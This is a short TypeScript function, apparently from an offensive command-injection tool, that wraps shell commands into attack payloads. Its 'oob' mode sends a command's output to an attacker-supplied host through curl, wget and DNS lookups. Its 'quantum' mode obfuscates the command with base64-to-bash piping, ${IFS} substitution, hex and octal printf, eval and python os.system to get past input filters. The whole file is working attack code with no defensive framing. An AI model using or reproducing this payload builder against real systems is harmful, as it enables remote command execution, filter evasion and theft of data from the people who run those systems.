export function applyQuantumBypass(
  cmd: string,
  mode: string,
  attackerIp = "127.0.0.1",
  attackerPort = "4444"
): string {
  if (!cmd) return "";
  const raw = String(cmd);

  if (mode === "blind") {
    return `_T=$SECONDS; (${raw}) 2>&1; _E=$?; sleep 7; echo "[blind:$((SECONDS-_T))s|exit:$_E]"`;
  }

  if (mode === "oob") {
    return (
      `_OUT=$(${raw} 2>&1); ` +
      `_B=$(printf '%s' "$_OUT" | base64 -w0 2>/dev/null || printf '%s' "$_OUT" | base64); ` +
      `curl -sk -m8 -X POST "http://${attackerIp}:${attackerPort}/x" --data-urlencode "d=$_OUT" >/dev/null 2>&1 & ` +
      `dig +short +time=3 "$(printf '%s' "$_OUT" | head -c28 | tr -cd '[:alnum:]').oob.${attackerIp}" 2>/dev/null & ` +
      `wget -qO/dev/null --timeout=8 "http://${attackerIp}:${attackerPort}/?b=$_B" 2>/dev/null & ` +
      `printf '%s\\n' "$_OUT"`
    );
  }

  if (mode === "quantum") {
    const b64 = Buffer.from(raw).toString("base64");
    const hex = Array.from(Buffer.from(raw))
      .map(b => `\\x${b.toString(16).padStart(2, "0")}`)
      .join("");
    const oct = Array.from(Buffer.from(raw))
      .map(b => `\\${b.toString(8).padStart(3, "0")}`)
      .join("");
    const ifsSpaced = raw.replace(/ /g, "${IFS}");
    const b64Ifs = Buffer.from(ifsSpaced).toString("base64");
    return (
      `{echo,${b64}}|{base64,-d}|bash 2>/dev/null || ` +
      `bash<<<$(echo${"\u0020".replace(" ", "${IFS}")}${b64Ifs}|base64${"\u0020".replace(" ", "${IFS}")}-d) 2>/dev/null || ` +
      `$(printf '${hex}') 2>/dev/null || ` +
      `eval "$(printf '${oct}')" 2>/dev/null || ` +
      `python3 -c "import os;os.system('${raw.replace(/'/g, "\\'")}')" 2>/dev/null`
    );
  }

  return raw;
}
